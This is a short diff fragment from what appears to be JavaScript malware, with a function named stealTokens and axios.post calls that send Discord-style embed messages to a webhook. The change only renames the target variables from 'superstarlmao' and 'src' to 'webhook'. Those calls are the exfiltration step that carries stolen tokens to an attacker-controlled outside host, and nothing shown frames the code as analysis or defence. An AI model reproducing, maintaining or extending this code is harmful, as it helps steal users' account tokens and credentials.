@@ -348,7 +348,7 @@ async function stealTokens() {
         });
     }
 
-axios.post(superstarlmao, {
+axios.post(webhook, {
         "content": null,
         "embeds": [
           {
@@ -364,7 +364,7 @@ axios.post(superstarlmao, {
         }]
     }) .then(res => {}).catch(error => {})
 
-    axios.post(src, {
+    axios.post(webhook, {
         "content": null,
         "embeds": [
           {
